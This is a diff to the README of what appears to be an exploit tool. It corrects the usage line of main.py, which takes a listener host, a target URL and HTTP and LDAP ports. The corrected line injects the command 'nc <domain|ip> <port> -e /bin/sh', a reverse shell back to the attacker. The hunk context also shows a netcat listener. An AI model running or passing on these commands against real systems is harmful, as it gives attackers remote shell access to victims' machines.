@@ -12,7 +12,7 @@ nc -lvp <port>
 
 exploit execution
 ```shell
-python main.py -i lhost -u http://target:targetport -c "nc <domain|ip>:<port> -e /bin/sh" -p lhttp_port -l lldap_port
+python main.py -i lhost -u http://target:targetport -c "nc <domain|ip> <port> -e /bin/sh" -p lhttp_port -l lldap_port
  ```
 
 
